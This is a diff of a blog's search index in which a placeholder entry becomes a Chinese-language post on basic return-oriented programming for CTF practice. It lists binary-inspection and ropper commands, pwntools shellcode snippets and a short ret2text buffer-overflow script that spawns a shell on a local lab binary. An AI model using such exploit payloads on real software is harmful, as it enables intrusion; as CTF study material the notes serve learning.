@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[test]]></title>
+    <title><![CDATA[基本ROP]]></title>
     <url>%2F2019%2F04%2F28%2Ftest%2F</url>
-    <content type="text"><![CDATA[test]]></content>
+    <content type="text"><![CDATA[常用命令 函数名查询 ns binary | grep &#39; t &#39; GOT表 readelf --relocs binary PLT表 objdump -M intel -dj .plt binary 字符串 rabin2 -z binary rooper pipenv run ropper --file binary --search &quot;xor&quot; pwntools相关context(os=&#39;linux&#39;, arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) gdb.attach(sh,&#39;b *0xbb&#39;) r.sendline(asm(shellcraft.sh())) 基础ROPret2text简单来说就是跳转到程序本身已有的代码，程序中如果有调用system(“/bin/sh”)的代码，直接将函数返回地址覆盖为目标地址。算偏移量可以使用pattern offset。 一个样例payload 1234567##!/usr/bin/env pythonfrom pwn import *sh = process('./ret2text')target = 0x804863ash.sendline('A' * (0x6c+4) + p32(target))sh.interactive()]]></content>
   </entry>
   <entry>
     <title><![CDATA[TopHatSec:Freshly- Vulnhub]]></title>
